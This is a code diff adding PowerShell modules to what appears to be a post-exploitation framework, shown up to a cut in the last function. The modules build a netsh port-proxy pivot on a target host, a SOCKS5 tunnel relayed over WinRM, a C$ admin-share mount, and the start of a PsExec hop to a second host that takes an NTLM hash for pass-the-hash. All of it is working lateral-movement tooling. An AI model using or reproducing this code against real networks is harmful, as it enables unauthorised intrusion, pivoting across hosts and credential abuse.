@@ -5871,3 +5871,961 @@ function Invoke-ARModuleWmiSubscription {
         Left     = [int]$left
     }
 }
+
+function Invoke-ARModulePivotProxy {
+    param(
+        [switch]$Remove,
+        [int]$ListenPort = 8080,
+        [string]$ListenAddress = '0.0.0.0',
+        [int]$ConnectPort = 8080,
+        [string]$ConnectAddress = ''
+    )
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Pivot port proxy'
+    $session = Get-ARTargetSession
+    $mode = 'add'
+    if ($Remove) { $mode = 'remove' }
+    elseif (-not $script:ARInvokedFromOption) {
+        $choice = Read-ARValue 'Operation (1 add, 2 list, 3 remove)' '1'
+        if ($choice -eq '2') { $mode = 'list' }
+        elseif ($choice -eq '3') { $mode = 'remove' }
+    }
+    if ($mode -eq 'add' -and -not $script:ARInvokedFromOption) {
+        $text = Read-ARValue 'Listen port on the target' ([string]$ListenPort)
+        $parsed = 0
+        if (-not [int]::TryParse($text, [ref]$parsed) -or $parsed -lt 1 -or $parsed -gt 65535) { throw ('Invalid listen port: ' + $text) }
+        $ListenPort = $parsed
+        $ListenAddress = Read-ARValue 'Listen address on the target' $ListenAddress
+        $text = Read-ARValue 'Destination port' ([string]$ConnectPort)
+        if (-not [int]::TryParse($text, [ref]$parsed) -or $parsed -lt 1 -or $parsed -gt 65535) { throw ('Invalid destination port: ' + $text) }
+        $ConnectPort = $parsed
+        $ConnectAddress = Read-ARValue 'Destination address' $ConnectAddress
+    }
+    if ($mode -eq 'add') {
+        if ([string]::IsNullOrWhiteSpace($ConnectAddress)) { throw 'The destination address is required to publish a pivot proxy.' }
+        if ([string]::IsNullOrWhiteSpace($ListenAddress)) { throw 'The listen address is required to publish a pivot proxy.' }
+    }
+    # netsh keeps every v4tov4 rule under this key: the value name is
+    # "listenaddress/listenport" and the data is "connectaddress/connectport".
+    # Reading the registry is language independent; parsing `netsh show` is not,
+    # so every listing and every conflict check below reads the key directly.
+    $listBlock = {
+        $root = 'HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp'
+        if (-not (Test-Path -LiteralPath $root)) { return @() }
+        $key = Get-Item -LiteralPath $root -ErrorAction Stop
+        $rules = New-Object System.Collections.Generic.List[object]
+        foreach ($name in @($key.GetValueNames())) {
+            if ([string]::IsNullOrWhiteSpace([string]$name)) { continue }
+            $slash = ([string]$name).LastIndexOf('/')
+            if ($slash -lt 1) { continue }
+            $destination = [string]$key.GetValue($name, '', [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
+            $connectSlash = $destination.LastIndexOf('/')
+            if ($connectSlash -lt 1) { continue }
+            $rules.Add([pscustomobject]@{
+                ListenAddress  = ([string]$name).Substring(0, $slash)
+                ListenPort     = ([string]$name).Substring($slash + 1)
+                ConnectAddress = $destination.Substring(0, $connectSlash)
+                ConnectPort    = $destination.Substring($connectSlash + 1)
+            })
+        }
+        return @($rules.ToArray())
+    }
+    $existingRules = @(Invoke-ARRemote -Session $session -ScriptBlock $listBlock)
+    Write-ARInfo ('Port proxy rules already on ' + $target + ': ' + [string]$existingRules.Count)
+    foreach ($rule in $existingRules) {
+        Write-Host ('    ' + [string]$rule.ListenAddress + ':' + [string]$rule.ListenPort + ' -> ' + [string]$rule.ConnectAddress + ':' + [string]$rule.ConnectPort)
+    }
+    $created = $false
+    $removed = @()
+    $failed = @()
+    $message = ''
+    if ($mode -eq 'add') {
+        $addBlock = {
+            param($listenPort, $listenAddress, $connectPort, $connectAddress)
+            $root = 'HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp'
+            # Refuse a second rule on the same listen endpoint: netsh overwrites
+            # silently and the first pivot would disappear without a word.
+            if (Test-Path -LiteralPath $root) {
+                $key = Get-Item -LiteralPath $root -ErrorAction Stop
+                foreach ($name in @($key.GetValueNames())) {
+                    $slash = ([string]$name).LastIndexOf('/')
+                    if ($slash -lt 1) { continue }
+                    if (([string]$name).Substring(0, $slash) -ne $listenAddress) { continue }
+                    if (([string]$name).Substring($slash + 1) -ne [string]$listenPort) { continue }
+                    return [pscustomobject]@{
+                        Ok       = $false
+                        Conflict = $true
+                        Text     = ('listen endpoint already published: ' + $listenAddress + ':' + $listenPort + ' -> ' + [string]$key.GetValue($name, ''))
+                        Landed   = $false
+                    }
+                }
+            }
+            $output = @(& netsh.exe interface portproxy add v4tov4 ('listenport=' + $listenPort) ('listenaddress=' + $listenAddress) ('connectport=' + $connectPort) ('connectaddress=' + $connectAddress) 2>&1)
+            $exit = $LASTEXITCODE
+            $text = ((@($output) | ForEach-Object { [string]$_ }) -join ' ').Trim()
+            # netsh returns 0 for addresses it quietly refuses, so the proof is
+            # the registry value, not the exit code.
+            $landed = $false
+            if (Test-Path -LiteralPath $root) {
+                $key = Get-Item -LiteralPath $root -ErrorAction Stop
+                if ($null -ne $key.GetValue(($listenAddress + '/' + [string]$listenPort), $null)) { $landed = $true }
+            }
+            return [pscustomobject]@{ Ok = $landed; Conflict = $false; Text = $text; Landed = $landed; ExitCode = $exit }
+        }
+        $result = Invoke-ARRemote -Session $session -ArgumentList $ListenPort, $ListenAddress, $ConnectPort, $ConnectAddress -ScriptBlock $addBlock
+        if ([bool]$result.Conflict) { throw ('Pivot proxy refused: ' + [string]$result.Text) }
+        $created = [bool]$result.Ok
+        $message = [string]$result.Text
+        if (-not $created) {
+            throw ('netsh did not publish the rule (' + $ListenAddress + ':' + $ListenPort + ' -> ' + $ConnectAddress + ':' + $ConnectPort + '). ' + $message)
+        }
+        $record = [string]$ListenPort + '|' + $ListenAddress
+        if (-not $script:ARPortProxyPorts.Contains($record)) { $script:ARPortProxyPorts.Add($record) }
+        Write-ARSuccess ('Pivot proxy published on ' + $target + ': ' + $ListenAddress + ':' + $ListenPort + ' -> ' + $ConnectAddress + ':' + $ConnectPort)
+    }
+    elseif ($mode -eq 'remove') {
+        $entries = @($script:ARPortProxyPorts.ToArray())
+        if ($entries.Count -eq 0) {
+            Write-ARInfo 'No pivot proxy was registered by this session, so nothing is removed.'
+        }
+        else {
+            $removeBlock = {
+                param($items)
+                $root = 'HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp'
+                $deleted = New-Object System.Collections.Generic.List[string]
+                $kept = New-Object System.Collections.Generic.List[string]
+                if (Test-Path -LiteralPath $root) {
+                    $key = Get-Item -LiteralPath $root -ErrorAction Stop
+                    foreach ($entry in @($items)) {
+                        $text = [string]$entry
+                        if ([string]::IsNullOrWhiteSpace($text)) { continue }
+                        $bar = $text.IndexOf('|')
+                        $listenPort = $text
+                        $listenAddress = '0.0.0.0'
+                        if ($bar -ge 0) {
+                            $listenPort = $text.Substring(0, $bar)
+                            $listenAddress = $text.Substring($bar + 1)
+                        }
+                        if ([string]::IsNullOrWhiteSpace($listenPort)) { continue }
+                        $valueName = $listenAddress + '/' + $listenPort
+                        if ($null -eq $key.GetValue($valueName, $null)) { continue }
+                        $null = & netsh.exe interface portproxy delete v4tov4 ('listenport=' + $listenPort) ('listenaddress=' + $listenAddress) 2>&1
+                        if ($null -ne $key.GetValue($valueName, $null)) { $kept.Add($text) }
+                        else { $deleted.Add($text) }
+                    }
+                }
+                return [pscustomobject]@{ Deleted = @($deleted.ToArray()); Failed = @($kept.ToArray()) }
+            }
+            $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($entries)) -ScriptBlock $removeBlock
+            $removed = @($removal.Deleted)
+            $failed = @($removal.Failed)
+            foreach ($entry in $removed) {
+                [void]$script:ARPortProxyPorts.Remove([string]$entry)
+                Write-ARSuccess ('Pivot proxy removed: ' + [string]$entry)
+            }
+            foreach ($entry in $failed) { Write-ARWarn ('Pivot proxy still published: ' + [string]$entry) }
+        }
+    }
+    Set-ARStatus ('Pivot proxy ' + $mode + ' finished') 'Ok'
+    return [pscustomobject]@{
+        Id             = '620'
+        Action         = 'PivotProxy'
+        Mode           = $mode
+        Target         = $target
+        ListenAddress  = $ListenAddress
+        ListenPort     = [int]$ListenPort
+        ConnectAddress = $ConnectAddress
+        ConnectPort    = [int]$ConnectPort
+        Existing       = @($existingRules)
+        Created        = [bool]$created
+        Removed        = @($removed)
+        Failed         = @($failed)
+        Output         = $message
+    }
+}
+
+function Invoke-ARModuleSocksOverWinRm {
+    param(
+        [int]$Port = 1080,
+        [string]$BindAddress = '127.0.0.1',
+        [int]$LifetimeSeconds = 1800,
+        [int]$MaxConnections = 8,
+        [int]$IdleTimeoutSeconds = 120
+    )
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'SOCKS over WinRM'
+    $session = Get-ARTargetSession
+    if (-not $script:ARInvokedFromOption) {
+        $text = Read-ARValue 'Local SOCKS port' ([string]$Port)
+        $parsed = 0
+        if (-not [int]::TryParse($text, [ref]$parsed) -or $parsed -lt 0 -or $parsed -gt 65535) { throw ('Invalid SOCKS port: ' + $text) }
+        $Port = $parsed
+        $BindAddress = Read-ARValue 'Local bind address' $BindAddress
+    }
+    if ($LifetimeSeconds -lt 5) { $LifetimeSeconds = 5 }
+    if ($MaxConnections -lt 1) { $MaxConnections = 1 }
+    $address = [System.Net.IPAddress]::Parse($BindAddress)
+    $listener = New-Object System.Net.Sockets.TcpListener($address, $Port)
+    try { $listener.Start() }
+    catch { throw ('The local SOCKS listener could not bind ' + $BindAddress + ':' + [string]$Port + ': ' + $_.Exception.Message) }
+    $actualPort = [int]$listener.LocalEndpoint.Port
+    $deadline = (Get-Date).AddSeconds($LifetimeSeconds)
+    $handled = 0
+    $failures = New-Object System.Collections.Generic.List[string]
+    $readExact = {
+        param($stream, $count, $timeoutMs)
+        $buffer = New-Object byte[] $count
+        $offset = 0
+        $limit = (Get-Date).AddMilliseconds($timeoutMs)
+        while ($offset -lt $count) {
+            if ((Get-Date) -gt $limit) { throw 'SOCKS handshake timed out' }
+            try { $read = $stream.Read($buffer, $offset, $count - $offset) }
+            catch { throw ('SOCKS handshake failed: ' + $_.Exception.Message) }
+            if ($read -le 0) { throw 'The SOCKS client closed during the handshake.' }
+            $offset += $read
+        }
+        return $buffer
+    }
+    $startBlock = {
+        param($directory, $destHost, $destPort, $jobName)
+        if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
+        $job = Start-Job -Name $jobName -ArgumentList $directory, $destHost, $destPort -ScriptBlock {
+            param($work, $hopHost, $hopPort)
+            $outPath = Join-Path $work 'out'
+            $errorPath = Join-Path $work 'err'
+            $client = New-Object System.Net.Sockets.TcpClient
+            try {
+                $async = $client.BeginConnect($hopHost, $hopPort, $null, $null)
+                if (-not $async.AsyncWaitHandle.WaitOne(5000, $false)) { throw ('connect timeout to ' + $hopHost + ':' + [string]$hopPort) }
+                $client.EndConnect($async)
+                $stream = $client.GetStream()
+                # Append mode with read sharing: the operator tails this file
+                # while the relay writes it, so every chunk is flushed at once.
+                $output = [System.IO.File]::Open($outPath, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
+                try {
+                    $life = (Get-Date).AddSeconds(1800)
+                    $lastRead = Get-Date
+                    while ((Get-Date) -lt $life) {
+                        if (Test-Path -LiteralPath (Join-Path $work 'stop')) { break }
+                        # Chunks are numbered by the operator, so ordering them here
+                        # keeps the byte stream intact even when two land together.
+                        $queued = New-Object System.Collections.Generic.List[object]
+                        foreach ($file in @(Get-ChildItem -LiteralPath $work -Filter 'req.*.bin' -File -ErrorAction SilentlyContinue)) {
+                            $index = 0
+                            if (-not [int]::TryParse([string]$file.BaseName.Substring(4), [ref]$index)) { continue }
+                            $queued.Add([pscustomobject]@{ Index = $index; Path = [string]$file.FullName })
+                        }
+                        foreach ($item in @($queued.ToArray() | Sort-Object -Property Index)) {
+                            if (-not (Test-Path -LiteralPath [string]$item.Path)) { continue }
+                            $payload = [System.IO.File]::ReadAllBytes([string]$item.Path)
+                            Remove-Item -LiteralPath ([string]$item.Path) -Force -ErrorAction SilentlyContinue
+                            if ($payload.Length -gt 0) {
+                                $stream.Write($payload, 0, $payload.Length)
+                                $stream.Flush()
+                            }
+                        }
+                        if ($client.Available -gt 0) {
+                            $buffer = New-Object byte[] 16384
+                            $read = $stream.Read($buffer, 0, $buffer.Length)
+                            if ($read -le 0) { break }
+                            $output.Write($buffer, 0, $read)
+                            $output.Flush()
+                            $lastRead = Get-Date
+                        }
+                        elseif (((Get-Date) - $lastRead).TotalSeconds -gt 600) { break }
+                        Start-Sleep -Milliseconds 40
+                    }
+                }
+                finally { $output.Dispose() }
+            }
+            catch { try { [System.IO.File]::WriteAllText($errorPath, $_.Exception.Message) } catch { } }
+            finally {
+                try { $client.Close() } catch { }
+                try { [System.IO.File]::WriteAllText((Join-Path $work 'eof'), '1') } catch { }
+            }
+        }
+        return [pscustomobject]@{ Id = [int]$job.Id; Name = [string]$job.Name; State = [string]$job.State }
+    }
+    $pollBlock = {
+        param($directory, $offset, $wantData)
+        $result = [pscustomobject]@{ Size = [int64]0; Data = ''; Eof = $false; Error = ''; Pending = 0 }
+        $outPath = Join-Path $directory 'out'
+        if (Test-Path -LiteralPath $outPath) {
+            $info = Get-Item -LiteralPath $outPath -ErrorAction SilentlyContinue
+            if ($info) { $result.Size = [int64]$info.Length }
+            if ($wantData -and $result.Size -gt $offset) {
+                $length = [int]($result.Size - $offset)
+                if ($length -gt 32768) { $length = 32768 }
+                $stream = [System.IO.File]::Open($outPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+                try {
+                    $stream.Position = $offset
+                    $buffer = New-Object byte[] $length
+                    $read = $stream.Read($buffer, 0, $length)
+                    if ($read -gt 0) { $result.Data = [Convert]::ToBase64String($buffer, 0, $read) }
+                }
+                finally { $stream.Dispose() }
+            }
+        }
+        $result.Pending = @(Get-ChildItem -LiteralPath $directory -Filter 'req.*.bin' -File -ErrorAction SilentlyContinue).Count
+        $result.Eof = Test-Path -LiteralPath (Join-Path $directory 'eof')
+        $errorPath = Join-Path $directory 'err'
+        if (Test-Path -LiteralPath $errorPath) {
+            try { $result.Error = [string]([System.IO.File]::ReadAllText($errorPath)) } catch { }
+        }
+        return $result
+    }
+    $stopBlock = {
+        param($directory)
+        $closed = 0
+        $removed = 0
+        $left = 0
+        try { [System.IO.File]::WriteAllText((Join-Path $directory 'stop'), '1') } catch { }
+        foreach ($job in @(Get-Job -ErrorAction SilentlyContinue)) {
+            if ([string]$job.Name -notlike 'ARPivot_*') { continue }
+            try { Stop-Job -Job $job -ErrorAction Stop; $closed++ } catch { }
+            try { Remove-Job -Job $job -Force -ErrorAction SilentlyContinue } catch { }
+        }
+        if (Test-Path -LiteralPath $directory) {
+            for ($attempt = 0; $attempt -lt 3; $attempt++) {
+                try {
+                    Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction Stop
+                    break
+                }
+                catch { Start-Sleep -Milliseconds 150 }
+            }
+            if (Test-Path -LiteralPath $directory) { $left = 1 } else { $removed = 1 }
+        }
+        return [pscustomobject]@{ Closed = [int]$closed; Removed = [int]$removed; Left = [int]$left }
+    }
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    Write-Host ('SOCKS5 over WinRM --> ' + 'socks5://' + $BindAddress + ':' + [string]$actualPort) -ForegroundColor Blue
+    Write-Host ('Operator process id: ' + [string]$PID + '   target: ' + $target + '   lifetime: ' + [string]$LifetimeSeconds + ' s') -ForegroundColor Gray
+    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
+    try {
+        while ((Get-Date) -lt $deadline -and $handled -lt $MaxConnections) {
+            if (-not $listener.Pending()) { Start-Sleep -Milliseconds 100; continue }
+            $connection = $listener.AcceptTcpClient()
+            $connection.NoDelay = $true
+            $remoteDirectory = 'C:\Windows\Temp\' + (New-ARRemoteTempName)
+            $jobName = 'ARPivot_' + (New-ARModuleToken -Length 6)
+            $relayStream = $null
+            try {
+                $relayStream = $connection.GetStream()
+                $relayStream.ReadTimeout = 10000
+                $relayStream.WriteTimeout = 10000
+                $greeting = & $readExact $relayStream 2 10000
+                if ([int]$greeting[0] -ne 5) { throw 'Not a SOCKS5 client.' }
+                $methods = & $readExact $relayStream ([int]$greeting[1]) 10000
+                $relayStream.Write([byte[]]@(5, 0), 0, 2)
+                $request = & $readExact $relayStream 4 10000
+                if ([int]$request[0] -ne 5) { throw 'The SOCKS request has the wrong version.' }
+                if ([int]$request[1] -ne 1) {
+                    $relayStream.Write([byte[]]@(5, 7, 0, 1, 0, 0, 0, 0, 0, 0), 0, 10)
+                    throw ('SOCKS command ' + [string]$request[1] + ' is not supported: only CONNECT is.')
+                }
+                $destHost = ''
+                switch ([int]$request[3]) {
+                    1 {
+                        $raw = & $readExact $relayStream 4 10000
+                        $destHost = ([System.Net.IPAddress]::new([byte[]]$raw)).ToString()
+                    }
+                    3 {
+                        $length = (& $readExact $relayStream 1 10000)[0]
+                        $raw = & $readExact $relayStream ([int]$length) 10000
+                        $destHost = [System.Text.Encoding]::ASCII.GetString($raw)
+                    }
+                    4 {
+                        $raw = & $readExact $relayStream 16 10000
+                        $destHost = ([System.Net.IPAddress]::new([byte[]]$raw)).ToString()
+                    }
+                    default { throw ('SOCKS address type ' + [string]$request[3] + ' is not supported.') }
+                }
+                $portBytes = & $readExact $relayStream 2 10000
+                $destPort = ([int]$portBytes[0] * 256) + [int]$portBytes[1]
+                if ([string]::IsNullOrWhiteSpace($destHost)) { throw 'The SOCKS request has no destination host.' }
+                if ($destPort -lt 1 -or $destPort -gt 65535) { throw ('The SOCKS request has an invalid destination port: ' + [string]$destPort) }
+                Write-ARInfo ('Relaying ' + $destHost + ':' + [string]$destPort + ' through ' + $target + ' (' + $remoteDirectory + ')')
+                $started = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $destHost, $destPort, $jobName -ScriptBlock $startBlock
+                if (-not $script:ARRemoteTempDirs.Contains($remoteDirectory)) { $script:ARRemoteTempDirs.Add($remoteDirectory) }
+                $relayStream.Write([byte[]]@(5, 0, 0, 1, 127, 0, 0, 1, 0, 0), 0, 10)
+                $handled++
+                Write-ARProgress -Activity 'SOCKS over WinRM' -Percent ([int](($handled * 100) / $MaxConnections)) -Status ('connection ' + [string]$handled)
+                $sequence = 1
+                $offset = 0
+                $idle = (Get-Date).AddSeconds($IdleTimeoutSeconds)
+                while ($true) {
+                    if ((Get-Date) -gt $deadline) { Write-ARWarn 'The SOCKS tunnel reached its lifetime cap and closed.'; break }
+                    if ((Get-Date) -gt $idle) { Write-ARWarn 'The SOCKS tunnel closed after the idle timeout.'; break }
+                    $state = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $offset, $true -ScriptBlock $pollBlock
+                    if (-not [string]::IsNullOrEmpty([string]$state.Error)) { throw ('The relay on ' + $target + ' failed: ' + [string]$state.Error) }
+                    $moved = $false
+                    $payload = [string]$state.Data
+                    if (-not [string]::IsNullOrEmpty($payload)) {
+                        $bytes = [Convert]::FromBase64String($payload)
+                        $relayStream.Write($bytes, 0, $bytes.Length)
+                        $relayStream.Flush()
+                        $offset += $bytes.Length
+                        $idle = (Get-Date).AddSeconds($IdleTimeoutSeconds)
+                        $moved = $true
+                    }
+                    if ([bool]$state.Eof) {
+                        if ([int64]$state.Size -le $offset) { break }
+                    }
+                    if ([int]$state.Pending -lt 8 -and $relayStream.DataAvailable) {
+                        $buffer = New-Object byte[] 16384
+                        $read = $relayStream.Read($buffer, 0, $buffer.Length)
+                        if ($read -le 0) { break }
+                        $chunk = New-Object byte[] $read
+                        [Array]::Copy($buffer, $chunk, $read)
+                        $requestPath = Join-Path $remoteDirectory ('req.' + [string]$sequence + '.bin')
+                        Invoke-ARRemote -Session $session -ArgumentList $requestPath, ([Convert]::ToBase64String($chunk)) -ScriptBlock {
+                            param($path, $base64)
+                            [System.IO.File]::WriteAllBytes($path, [Convert]::FromBase64String($base64))
+                        } | Out-Null
+                        $sequence++
+                        $idle = (Get-Date).AddSeconds($IdleTimeoutSeconds)
+                        $moved = $true
+                    }
+                    if (-not $moved) { Start-Sleep -Milliseconds 20 }
+                }
+            }
+            catch {
+                $failures.Add($_.Exception.Message)
+                Write-ARWarn ('SOCKS connection ended: ' + $_.Exception.Message)
+            }
+            finally {
+                try {
+                    $teardown = Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock $stopBlock
+                    if ([int]$teardown.Left -ne 0) { Write-ARWarn ('The relay directory is still on ' + $target + ': ' + $remoteDirectory) }
+                    else { [void]$script:ARRemoteTempDirs.Remove($remoteDirectory) }
+                }
+                catch { Write-ARWarn ('Relay teardown on ' + $target + ' failed: ' + $_.Exception.Message) }
+                try { if ($relayStream) { $relayStream.Close() } } catch { }
+                try { $connection.Close() } catch { }
+            }
+        }
+    }
+    finally {
+        try { $listener.Stop() } catch { }
+        try { $listener.Server.Close() } catch { }
+        $leak = 0
+        try {
+            $probe = New-Object System.Net.Sockets.TcpClient
+            try {
+                $async = $probe.BeginConnect($BindAddress, $actualPort, $null, $null)
+                if ($async.AsyncWaitHandle.WaitOne(1000, $false)) { $probe.EndConnect($async); $leak = 1 }
+            }
+            catch { }
+            finally { $probe.Close() }
+        }
+        catch { }
+        if ($leak -eq 1) { Write-ARWarn ('The SOCKS port ' + [string]$actualPort + ' still accepts connections after the close.') }
+    }
+    Set-ARStatus ('SOCKS over WinRM stopped after ' + [string]$handled + ' connection(s)') 'Ok'
+    return [pscustomobject]@{
+        Id         = '621'
+        Action     = 'SocksOverWinRm'
+        Target     = $target
+        Uri        = ('socks5://' + $BindAddress + ':' + [string]$actualPort)
+        Port       = [int]$actualPort
+        ProcessId  = [int]$PID
+        Connections = [int]$handled
+        PortFreed  = [bool]($leak -eq 0)
+        Failures   = @($failures.ToArray())
+    }
+}
+
+function Invoke-ARModuleShareMount {
+    param(
+        [string]$Share = '',
+        [string]$DriveLetter = 'Z',
+        [string]$User = '',
+        [string]$Password = ''
+    )
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 445 -Purpose 'Share mount'
+    $session = Get-ARTargetSession
+    if ([string]::IsNullOrWhiteSpace($Share)) { $Share = '\\' + $target + '\C$' }
+    if ([string]::IsNullOrWhiteSpace($User)) { $User = Get-ARTargetUserName }
+    if ($script:ARInvokedFromOption) {
+        if ([string]::IsNullOrWhiteSpace($User)) { throw 'The share mount needs a user name; it cannot be prompted for in -option mode.' }
+        if ([string]::IsNullOrWhiteSpace($Password)) { throw 'The share mount needs a password; it cannot be prompted for in -option mode.' }
+    }
+    else {
+        $Share = Read-ARValue 'UNC path of the share' $Share
+        $DriveLetter = Read-ARValue 'Drive letter on the target' $DriveLetter
+        $User = Read-ARValue 'User for the share' $User
+        $plain = Read-ARSecret ('Password for ' + $User)
+        if (-not [string]::IsNullOrWhiteSpace($plain)) { $Password = $plain }
+    }
+    if ($Share -notmatch '^\\\\[^\\]+\\') { throw ('Not a UNC path: ' + $Share) }
+    $letter = $DriveLetter.Trim().TrimEnd(':')
+    if ($letter.Length -ne 1 -or $letter -notmatch '^[A-Za-z]$') { throw ('Invalid drive letter: ' + $DriveLetter) }
+    $letter = $letter.ToUpperInvariant()
+    if ([int][char]$letter -lt [int][char]'D') { throw ('Drive letter ' + $letter + ' is reserved for local volumes; pick D-Z.') }
+    if ([string]::IsNullOrWhiteSpace($Password)) { throw 'The share mount needs a password.' }
+    $drive = $letter + ':'
+    $mounted = $false
+    $alreadyMounted = $false
+    $message = ''
+    $removed = @()
+    $failed = @()
+    $mountBlock = {
+        param($uncPath, $driveLetter, $account, $secret)
+        $result = [pscustomobject]@{ Mounted = $false; Already = $false; Message = ''; User = $account; Letter = $driveLetter }
+        $driveName = $driveLetter + ':'
+        $taken = ''
+        foreach ($volume in [System.IO.DriveInfo]::GetDrives()) {
+            if ([string]$volume.Name -eq ($driveName + '\')) { $taken = [string]$volume.DriveType }
+        }
+        if ($taken -ne '') {
+            if ($taken -eq 'Network') {
+                $known = ''
+                try {
+                    foreach ($mapping in @(Get-SmbMapping -ErrorAction Stop)) {
+                        if (([string]$mapping.LocalPath).ToUpperInvariant() -eq ($driveName + '\')) { $known = [string]$mapping.RemotePath }
+                    }
+                }
+                catch { }
+                if ($known -eq $uncPath) {
+                    $result.Already = $true
+                    $result.Mounted = $true
+                    $result.Message = 'already mapped'
+                    return $result
+                }
+                if ($known -ne '') { throw ('Drive ' + $driveName + ' is already mapped to ' + $known + '.') }
+            }
+            throw ('Drive letter ' + $driveName + ' already exists on this host (' + $taken + ').')
+        }
+        # cmdkey keeps the secret out of the net use command line, which is the
+        # whole point of doing the two-step instead of passing /user to net use.
+        $null = & cmdkey.exe ('/generic:' + $uncPath) ('/user:' + $account) ('/pass:' + $secret) 2>&1
+        if ($LASTEXITCODE -ne 0) { throw ('cmdkey refused the credential for ' + $uncPath + ' (exit ' + [string]$LASTEXITCODE + ').') }
+        $output = @(& net.exe use $driveName $uncPath 2>&1)
+        $exit = $LASTEXITCODE
+        $text = ((@($output) | ForEach-Object { [string]$_ }) -join ' ').Trim()
+        $result.Message = $text
+        if ($exit -ne 0) { throw ('net use ' + $driveName + ' ' + $uncPath + ' failed (exit ' + [string]$exit + '): ' + $text) }
+        if (-not (Test-Path -LiteralPath ($driveName + '\'))) { throw ('net use returned 0 but ' + $driveName + '\ does not resolve.') }
+        $result.Mounted = $true
+        return $result
+    }
+    $cleanBlock = {
+        param($uncPath, $driveLetter)
+        $gone = New-Object System.Collections.Generic.List[string]
+        $kept = New-Object System.Collections.Generic.List[string]
+        $driveName = $driveLetter + ':'
+        $null = & net.exe use $driveName '/delete' '/y' 2>&1
+        if ($LASTEXITCODE -ne 0) { $kept.Add('net use ' + $driveName + ' /delete') } else { $gone.Add('net use ' + $driveName) }
+        $null = & cmdkey.exe ('/delete:' + $uncPath) 2>&1
+        if ($LASTEXITCODE -ne 0) { $kept.Add('cmdkey /delete:' + $uncPath) } else { $gone.Add('cmdkey ' + $uncPath) }
+        $left = 0
+        try {
+            foreach ($mapping in @(Get-SmbMapping -ErrorAction SilentlyContinue)) {
+                if (([string]$mapping.LocalPath).ToUpperInvariant() -eq ($driveName + '\')) { $left++ }
+                elseif ([string]$mapping.RemotePath -eq $uncPath) { $left++ }
+            }
+        }
+        catch { }
+        if ($left -gt 0) {
+            $kept.Add('mapping still listed after the delete')
+            $null = & net.exe use $driveName '/delete' '/y' 2>&1
+        }
+        $credentialLeft = 0
+        try {
+            $list = @(& cmdkey.exe '/list' 2>&1)
+            foreach ($line in $list) { if (([string]$line).IndexOf($uncPath, [System.StringComparison]::OrdinalIgnoreCase) -ge 0) { $credentialLeft++ } }
+        }
+        catch { }
+        if ($credentialLeft -gt 0) { $kept.Add('cmdkey entry still listed for ' + $uncPath) }
+        return [pscustomobject]@{ Removed = @($gone.ToArray()); Failed = @($kept.ToArray()); Left = [int]($left + $credentialLeft) }
+    }
+    try {
+        Write-ARInfo ('Mounting ' + $Share + ' as ' + $drive + ' on ' + $target + ' as ' + $User)
+        $result = Invoke-ARRemote -Session $session -ArgumentList $Share, $letter, $User, $Password -ScriptBlock $mountBlock
+        $mounted = [bool]$result.Mounted
+        $alreadyMounted = [bool]$result.Already
+        $message = [string]$result.Message
+        if ($mounted) {
+            if ($alreadyMounted) { Write-ARInfo ($drive + ' was already mapped to ' + $Share + '; it will be left as it was.') }
+            else { Write-ARSuccess ('Mounted ' + $Share + ' as ' + $drive + ' on ' + $target) }
+        }
+    }
+    finally {
+        try {
+            $cleanup = Invoke-ARRemote -Session $session -ArgumentList $Share, $letter -ScriptBlock $cleanBlock
+            $removed = @($cleanup.Removed)
+            $failed = @($cleanup.Failed)
+            foreach ($item in $removed) { Write-ARSuccess ('Removed: ' + [string]$item) }
+            foreach ($item in $failed) { Write-ARWarn ('Not removed: ' + [string]$item) }
+            if ([int]$cleanup.Left -eq 0) { Write-ARInfo ('No mapping and no stored credential is left for ' + $Share + ' on ' + $target) }
+        }
+        catch { $failed = @('cleanup could not run: ' + $_.Exception.Message); Write-ARWarn ('Share cleanup failed: ' + $_.Exception.Message) }
+    }
+    Set-ARStatus 'Share mount proof finished' 'Ok'
+    return [pscustomobject]@{
+        Id       = '622'
+        Action   = 'ShareMount'
+        Target   = $target
+        Share    = $Share
+        Drive    = $drive
+        User     = $User
+        Mounted  = [bool]$mounted
+        Existing = [bool]$alreadyMounted
+        Removed  = @($removed)
+        Failed   = @($failed)
+        Output   = $message
+    }
+}
+
+function Invoke-ARModuleHopPsExec {
+    param(
+        [string]$Computer = '',
+        [string]$User = '',
+        [string]$Password = '',
+        [string]$Hash = '',
+        [string]$Command = ''
+    )
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'PSexec hop'
+    Assert-ARPort -Computer $target -Port 445 -Purpose 'PSexec hop'
+    $session = Get-ARTargetSession
+    if ([string]::IsNullOrWhiteSpace($Computer)) {
+        if ($script:ARInvokedFromOption) { throw 'The PSexec hop needs a second host; it cannot be prompted for in -option mode.' }
+        $Computer = Read-ARValue 'Second host (reached from the first one)'
+    }
+    $hop = $Computer.Trim()
+    if ([string]::IsNullOrWhiteSpace($hop)) { throw 'The second host is empty.' }
+    if ([string]::IsNullOrWhiteSpace($User)) { $User = Get-ARTargetUserName }
+    if ([string]::IsNullOrWhiteSpace($Hash)) { $Hash = [string]$script:ARTarget['Hash'] }
+    if ([string]::IsNullOrWhiteSpace($Password)) { $Password = [string]$script:ARTarget['Password'] }
+    if (-not $script:ARInvokedFromOption) {
+        $User = Read-ARValue 'User for the second host' $User
+        $Hash = Read-ARValue 'NTLM hash for the second host (empty to use a password)' $Hash
+        if ([string]::IsNullOrWhiteSpace($Hash)) {
